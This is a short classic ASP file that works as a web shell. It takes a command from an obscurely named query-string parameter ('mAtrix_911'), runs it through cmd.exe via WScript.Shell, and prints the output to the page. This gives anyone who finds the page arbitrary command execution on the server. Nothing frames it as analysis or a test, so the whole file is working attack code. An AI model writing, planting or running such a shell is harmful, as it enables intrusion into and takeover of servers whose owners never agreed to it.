<%
Dim cmd, oShell, oExec
cmd = Request.QueryString("mAtrix_911")
If cmd <> "" Then
    Set oShell = CreateObject("WScript.Shell")
    Set oExec  = oShell.Exec("cmd.exe /c " & cmd)
    Response.Write "<pre>" & Server.HTMLEncode(oExec.StdOut.ReadAll()) & "</pre>"
    Set oExec  = Nothing
    Set oShell = Nothing
End If
%>
